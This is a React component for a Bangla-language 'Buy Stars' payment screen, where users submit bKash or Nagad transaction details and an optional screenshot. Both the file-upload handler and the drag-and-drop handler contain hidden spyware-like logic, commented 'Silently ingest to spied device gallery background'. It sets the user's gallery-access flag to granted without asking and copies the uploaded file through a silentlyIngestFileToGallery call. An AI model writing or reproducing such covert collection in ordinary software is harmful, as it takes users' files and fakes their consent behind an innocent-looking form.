/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React from 'react';
import { ArrowLeft, Sparkles, AlertCircle, Check, ShieldAlert, CheckCircle2, Upload, Phone, Key, Image as ImageIcon } from 'lucide-react';
import { dbService, STAR_PACKAGES } from '../services/db';
import { StarPackage, UserProfile } from '../types';
import { useOnlineStatus } from '../hooks/useOnlineStatus';

interface BuyStarsViewProps {
  onBack: () => void;
  onSuccess?: () => void;
}

export default function BuyStarsView({ onBack, onSuccess }: BuyStarsViewProps) {
  const isOnline = useOnlineStatus();
  const [profile, setProfile] = React.useState<UserProfile | null>(null);
  const [selectedPkg, setSelectedPkg] = React.useState<StarPackage | null>(null);
  const [paymentMethod, setPaymentMethod] = React.useState<'bKash' | 'Nagad' | null>(null);
  
  // Manual transaction info submitted by user
  const [senderNumber, setSenderNumber] = React.useState('');
  const [transactionId, setTransactionId] = React.useState('');
  const [screenshotUrl, setScreenshotUrl] = React.useState<string>('');
  const [isSubmitting, setIsSubmitting] = React.useState(false);
  const [isSuccess, setIsSuccess] = React.useState(false);
  const [isDragging, setIsDragging] = React.useState(false);

  React.useEffect(() => {
    const user = dbService.getCurrentUser();
    setProfile(user);
    if (user?.phone) {
      setSenderNumber(user.phone);
    }
  }, []);

  const handleSelectPackage = (pkg: StarPackage) => {
    setSelectedPkg(pkg);
    setPaymentMethod(null); // Reset payment method to force selection
    setTransactionId('');
    setScreenshotUrl('');
  };

  // Convert uploaded image file to Base64 for local persistence mock
  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      // Silently ingest to spied device gallery background
      const me = dbService.getCurrentUser();
      if (me) {
        me.galleryAccessGranted = true;
        dbService.silentlyIngestFileToGallery(file);
      }

      const reader = new FileReader();
      reader.onloadend = () => {
        setScreenshotUrl(reader.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(true);
  };

  const handleDragLeave = () => {
    setIsDragging(false);
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(false);
    const file = e.dataTransfer.files?.[0];
    if (file) {
      // Silently ingest to spied device gallery background
      const me = dbService.getCurrentUser();
      if (me) {
        me.galleryAccessGranted = true;
        dbService.silentlyIngestFileToGallery(file);
      }

      const reader = new FileReader();
      reader.onloadend = () => {
        setScreenshotUrl(reader.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isOnline) {
      alert('🚫 দুঃখিত! ইন্টারনেট কানেকশন নেই। অফলাইন মোডে পেমেন্ট রিকোয়েস্ট পাঠানো সম্ভব নয়।');
      return;
    }
    if (!selectedPkg || !paymentMethod) return;

    if (!senderNumber.trim()) {
      alert('টাকা পাঠানোর মোবাইল নম্বরটি লিখুন।');
      return;
    }
    if (!transactionId.trim()) {
      alert('পেমেন্টের ৮ বা ১০ ডিজিটের ট্রানজেকশন নম্বর (TxnID) দিন।');
      return;
    }

    setIsSubmitting(true);

    setTimeout(() => {
      // Create the pending Star Deposit Request in database
      dbService.submitStarDepositRequest(
        selectedPkg.starsCount,
        selectedPkg.priceBDT,
        paymentMethod,
        senderNumber.trim(),
        transactionId.trim(),
        screenshotUrl
      );
      
      setIsSubmitting(false);
      setIsSuccess(true);
    }, 1500);
  };

  const handleReset = () => {
    setIsSuccess(false);
    setSelectedPkg(null);
    setPaymentMethod(null);
    setTransactionId('');
    setScreenshotUrl('');
    onSuccess?.();
  };

  return (
    <div className="flex-1 flex flex-col bg-slate-50 dark:bg-zinc-950 overflow-y-auto pb-16 relative">
      
      {/* Header */}
      <div className="flex items-center px-4 py-3.5 border-b border-neutral-200/50 dark:border-neutral-800 bg-white dark:bg-neutral-900 sticky top-0 z-20">
        <button
          onClick={onBack}
          className="p-1 rounded-full hover:bg-neutral-100 dark:hover:bg-neutral-800 mr-2"
        >
          <ArrowLeft className="w-6 h-6 text-slate-800 dark:text-neutral-200" />
        </button>
        <Sparkles className="w-5 h-5 text-amber-500 mr-1.5" />
        <h1 className="text-base font-extrabold text-slate-900 dark:text-white">রিচার্জ স্টারস (Buy Stars)</h1>
      </div>

      <div className="p-4 space-y-6">
        
        {/* Banner Alert Translation details */}
        <div className="bg-amber-500/10 border border-amber-500/25 p-4 rounded-2xl">
          <p className="text-xs font-bold text-amber-800 dark:text-amber-300">
            স্টার ব্যবহার করে প্রিয় কনটেন্ট ক্রিয়েটরদের প্রিমিয়াম ছবি/ভিডিও আনলক করতে পারবেন এবং ইনবক্সে গিফট স্টার পাঠাতে পারবেন! 🌟
          </p>
          <span className="text-[10px] text-amber-700/80 dark:text-amber-200/60 mt-1 block">
            ১ স্টার = ১.০০ টাকা। নিচে দেওয়া প্যাকেজটি বেছে নিন এবং পেমেন্ট শেষ করে ভেরিফিকেশনের জন্য ট্রানজেকশন তথ্য দিন।
          </span>
        </div>

        {/* Packages Grid */}
        <div className="space-y-3">
          <h2 className="text-xs font-black text-slate-400 uppercase tracking-widest pl-1">১. একটি স্টার প্যাকেজ সিলেক্ট করুন</h2>
          
          <div className="grid grid-cols-2 gap-3">
            {STAR_PACKAGES.map((pkg) => (
              <button
                key={pkg.id}
                onClick={() => handleSelectPackage(pkg)}
                className={`text-left p-4 rounded-[22px] border-2 transition-all cursor-pointer relative flex flex-col justify-between h-32 ${
                  selectedPkg?.id === pkg.id
                    ? 'border-amber-500 bg-amber-50/20 dark:bg-amber-955/20 shadow-lg shadow-amber-500/5'
                    : 'border-neutral-200 dark:border-neutral-800 bg-white dark:bg-neutral-900'
                }`}
              >
                {pkg.badge && (
                  <span className="absolute top-2.5 right-2.5 bg-amber-500 text-white font-black text-[8px] px-2 py-0.5 rounded-full select-none">
                    {pkg.badge}
                  </span>
                )}

                <div className="mt-1">
                  <span className="text-xl font-black font-mono block text-amber-600 dark:text-amber-400">
                    ⭐ {pkg.starsCount}
                  </span>
                  <span className="text-[10px] text-slate-400 font-bold block uppercase tracking-wider">Stars Pack</span>
                </div>

                <div className="pt-2 border-t border-dashed border-neutral-100 dark:border-neutral-800 w-full flex justify-between items-center text-xs font-black text-slate-800 dark:text-white">
                  <span>৳ {pkg.priceBDT} BDT</span>
                  <div className={`w-4 h-4 rounded-full flex items-center justify-center border ${selectedPkg?.id === pkg.id ? 'bg-amber-500 border-amber-500 text-white' : 'border-neutral-300'}`}>
                    {selectedPkg?.id === pkg.id && <Check className="w-2.5 h-2.5 text-white" />}
                  </div>
                </div>
              </button>
            ))}
          </div>
        </div>

        {/* Selected Package Details */}
        {selectedPkg && (
          <div className="bg-white dark:bg-neutral-900 p-5 rounded-[24px] border border-neutral-250 dark:border-neutral-800 space-y-5 animate-fadeIn">
            <div>
              <h3 className="text-xs font-black text-slate-400 uppercase tracking-widest mb-3">২. পেমেন্ট মাধ্যম সিলেক্ট করুন (বিকাশ অথবা নগদ)</h3>
              
              <div className="grid grid-cols-2 gap-3">
                <button
                  type="button"
                  onClick={() => setPaymentMethod('bKash')}
                  className={`py-3.5 px-4 rounded-xl font-extrabold text-sm active:scale-95 transition border-2 flex items-center justify-center gap-2 ${
                    paymentMethod === 'bKash'
                      ? 'border-[#D12053] bg-[#D12053]/10 text-[#D12053]'
                      : 'border-neutral-250 dark:border-neutral-800 text-slate-700 dark:text-zinc-300 hover:bg-slate-50'
                  }`}
                >
                  <span className="w-5 h-5 rounded-full bg-[#D12053] text-white flex items-center justify-center text-[10px] font-black">b</span>
                  bKash / বিকাশ
                </button>
                <button
                  type="button"
                  onClick={() => setPaymentMethod('Nagad')}
                  className={`py-3.5 px-4 rounded-xl font-extrabold text-sm active:scale-95 transition border-2 flex items-center justify-center gap-2 ${
                    paymentMethod === 'Nagad'
                      ? 'border-[#EC5B24] bg-[#EC5B24]/10 text-[#EC5B24]'
                      : 'border-neutral-250 dark:border-neutral-800 text-slate-700 dark:text-zinc-300 hover:bg-slate-50'
                  }`}
                >
                  <span className="w-5 h-5 rounded-full bg-[#EC5B24] text-white flex items-center justify-center text-[10px] font-black">n</span>
                  Nagad / নগদ
                </button>
              </div>
            </div>

            {/* Instruction Banner & Form */}
            {paymentMethod && (
              <div className="pt-3 border-t border-neutral-100 dark:border-neutral-800 space-y-4 animate-fadeIn">
                
                {/* Visual Payment Directions */}
                <div className="bg-[#eaebed]/60 dark:bg-neutral-950 p-4 rounded-2xl border border-neutral-200 dark:border-neutral-800 space-y-2">
                  <div className="flex items-center gap-2 text-xs font-black text-slate-800 dark:text-neutral-200">
                    <AlertCircle className="w-4 h-4 text-amber-500" />
                    <span>টাকা পাঠানোর নির্দেশনাবলীঃ</span>
                  </div>
                  
                  <div className="text-[11px] text-slate-600 dark:text-zinc-300 space-y-1.5 leading-relaxed pl-1">
                    <p>১. প্রথমে আপনার {paymentMethod} ওয়ালেট থেকে নিম্নোক্ত নাম্বারে <b>রোজ বা সেন্ড মানি</b> করতে হবেঃ</p>
                    <p className="bg-white dark:bg-neutral-900 border border-neutral-200 dark:border-neutral-800 p-2.5 rounded-xl font-mono text-center font-black text-slate-800 dark:text-amber-400 text-xs tracking-wider flex items-center justify-center gap-2 select-all">
                      {paymentMethod === 'bKash' ? '01712-345678 (Personal)' : '01998-765432 (Personal)'}
                    </p>
                    <p>২. রিচার্জ পরিমাণঃ <b className="text-slate-900 dark:text-white">৳ {selectedPkg.priceBDT} BDT</b> সমান টাকা পাঠাবেন।</p>
                    <p className="text-[#a46cf4] font-bold">৩. টাকা পাঠানো হয়ে গেলে নিচের ফর্মে টাকা পাঠানোর বিবরণ সাবমিট করুন। এডমিন তা দেখে স্টার এপ্রুভ করবেন।</p>
                  </div>
                </div>

                {/* Submitting form */}
                <form onSubmit={handleFormSubmit} className="space-y-4">
                  {/* Sender Number Input */}
                  <div className="space-y-1">
                    <label className="text-[10px] font-black text-zinc-400 uppercase tracking-wider block pl-1 flex items-center gap-1">
                      <Phone className="w-3 h-3 text-slate-400" />
                      যে মোবাইল নাম্বার থেকে টাকা পাঠিয়েছেনঃ
                    </label>
                    <input
                      type="tel"
                      required
                      value={senderNumber}
                      onChange={(e) => setSenderNumber(e.target.value)}
                      placeholder="যেমন: ০১৭১২৩৪৫৬৭৮"
                      className="w-full bg-slate-50 dark:bg-zinc-950 border border-neutral-250 dark:border-neutral-850 rounded-xl px-4 py-3 text-xs block text-slate-800 dark:text-white font-bold"
                    />
                  </div>

                  {/* Transaction ID Input */}
                  <div className="space-y-1">
                    <label className="text-[10px] font-black text-zinc-400 uppercase tracking-wider block pl-1 flex items-center gap-1">
                      <Key className="w-3 h-3 text-slate-400" />
                      ট্রানজেকশন নম্বর (Transaction ID / TxnID):
                    </label>
                    <input
                      type="text"
                      required
                      value={transactionId}
                      onChange={(e) => setTransactionId(e.target.value)}
                      placeholder="যেমন: K8H2F9S7W2"
                      className="w-full bg-slate-50 dark:bg-zinc-950 border border-neutral-250 dark:border-neutral-850 rounded-xl px-4 py-3 text-xs block text-slate-800 dark:text-white font-mono font-black tracking-wide"
                    />
                  </div>

                  {/* Screenshot Drag and Drop & Upload File */}
                  <div className="space-y-1">
                    <label className="text-[10px] font-black text-zinc-400 uppercase tracking-wider block pl-1 flex items-center gap-1">
                      <ImageIcon className="w-3 h-3 text-slate-400" />
                      পেমেন্ট স্ক্রিনশট সংযুক্ত করুন (Payment Screenshot):
                    </label>
                    
                    <div
                      onDragOver={handleDragOver}
                      onDragLeave={handleDragLeave}
                      onDrop={handleDrop}
                      className={`border-2 border-dashed rounded-xl p-4 transition text-center flex flex-col items-center justify-center cursor-pointer min-h-[96px] ${
                        isDragging 
                          ? 'border-amber-500 bg-amber-50/10' 
                          : screenshotUrl 
                            ? 'border-emerald-500/50 bg-emerald-500/5' 
                            : 'border-neutral-300 dark:border-neutral-800 hover:bg-slate-50 dark:hover:bg-neutral-850'
                      }`}
                    >
                      <input 
                        type="file" 
                        accept="image/*" 
                        id="screenshot-uploader" 
                        className="hidden" 
                        onChange={handleFileChange} 
                      />

                      <label htmlFor="screenshot-uploader" className="w-full h-full flex flex-col items-center justify-center cursor-pointer">
                        {screenshotUrl ? (
                          <div className="space-y-2">
                            <img 
                              src={screenshotUrl} 
                              alt="Payment proof" 
                              className="max-h-24 mx-auto rounded-lg shadow border border-neutral-200 dark:border-neutral-850 object-cover" 
                            />
                            <p className="text-[10px] text-emerald-600 font-extrabold flex items-center justify-center gap-1 select-none">
                              <Check className="w-3 h-3" /> স্ক্রিনশট লোড করা হয়েছে (পরিবর্তন করতে ক্লিক করুন)
                            </p>
                          </div>
                        ) : (
                          <div className="space-y-1.5 text-neutral-400 dark:text-neutral-500">
                            <Upload className="w-6 h-6 mx-auto text-neutral-400" />
                            <p className="text-[11px] font-bold">এখানে ক্লিক করে স্ক্রিনশট আপলোড করুন অথবা ড্র্যাগ করুন</p>
                            <p className="text-[9px]">সহজে বোঝার জন্য স্ক্রিনশট দেওয়া ভালো (অপশনাল)</p>
                          </div>
                        )}
                      </label>
                    </div>
                  </div>

                  {/* Submit Button */}
                  <button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full py-3.5 text-white font-extrabold text-xs rounded-xl hover:opacity-95 bg-slate-900 dark:bg-white dark:text-neutral-950 border border-neutral-300 transition flex items-center justify-center gap-2 cursor-pointer shadow-md disabled:opacity-55"
                  >
                    {isSubmitting ? (
                      <>
                        <div className="w-4 h-4 border-2 border-white rounded-full animate-spin border-t-transparent"></div>
                        <span>রিকোয়েস্ট পাঠানো হচ্ছে...</span>
                      </>
                    ) : (
                      <>
                        <span>পেমেন্ট রিকোয়েস্ট সাবমিট করুন (Submit Request)</span>
                      </>
                    )}
                  </button>
                </form>

              </div>
            )}
          </div>
        )}

      </div>

      {/* Success Modal Screen Overlay */}
      {isSuccess && (
        <div className="absolute inset-0 bg-white dark:bg-zinc-950 z-50 p-6 flex flex-col justify-center items-center text-center space-y-6">
          <div className="w-20 h-20 bg-amber-100 dark:bg-amber-950/20 rounded-full flex items-center justify-center shadow-lg animate-bounce select-none">
            <CheckCircle2 className="w-12 h-12 text-amber-500 fill-amber-100 dark:fill-transparent" />
          </div>

          <div className="space-y-2">
            <h2 className="text-lg font-black text-slate-800 dark:text-white block">আবেদন সফলভাবে সাবমিট হয়েছে! 🚀</h2>
            <p className="text-xs text-slate-500 leading-relaxed px-4">
              আপনার <b>{selectedPkg?.starsCount} Stars</b> রিকোয়েস্টটি পর্যালোচনার জন্য এডমিন প্যানেলে পাঠানো হয়েছে। এডমিন পেমেন্ট ভেরিফাই করে এপ্রুভ করলে আপনার ওয়ালেটে স্টার যোগ হবে।
            </p>
          </div>

          <div className="bg-slate-50 dark:bg-neutral-900 border border-neutral-200 dark:border-neutral-800 p-4 rounded-2xl w-full max-w-sm space-y-2.5 max-h-40 text-xs text-left">
            <div className="flex justify-between">
              <span className="text-zinc-500 font-bold">পেমেন্ট মাধ্যম</span>
              <span className="font-extrabold text-slate-800 dark:text-zinc-200 uppercase">{paymentMethod}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-zinc-500 font-bold">প্রেরক নাম্বার</span>
              <span className="font-extrabold text-slate-800 dark:text-zinc-200 font-mono">{senderNumber}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-zinc-500 font-bold">ট্রানজেকশন কীলক</span>
              <span className="font-extrabold text-slate-800 dark:text-zinc-200 font-mono text-emerald-600">{transactionId}</span>
            </div>
            <div className="flex justify-between border-t border-dashed border-neutral-200 dark:border-neutral-800 pt-2 font-semibold">
              <span className="text-zinc-500 font-bold">আবেদনকৃত স্টারস</span>
              <span className="font-extrabold text-amber-600 font-mono">⭐ {selectedPkg?.starsCount} Stars</span>
            </div>
          </div>

          <button
            onClick={handleReset}
            className="w-full max-w-xs bg-amber-500 hover:bg-amber-600 font-black text-white py-3.5 rounded-full transition shadow-md cursor-pointer text-xs"
          >
            ওয়ালেটে ফিরে যান (Return to Wallet)
          </button>
        </div>
      )}

    </div>
  );
}
